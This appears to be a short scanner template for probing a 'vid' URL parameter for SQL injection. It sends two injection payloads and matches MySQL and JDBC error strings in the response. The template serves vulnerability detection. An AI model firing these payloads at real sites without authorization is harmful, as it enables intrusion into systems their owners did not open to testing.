id: sqli6-generic-21
name: 'SQLi generic probe in vid'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via vid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      vid:
        - ''' HAVING 1=1--'
        - '1''||''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'Warning: mysql'
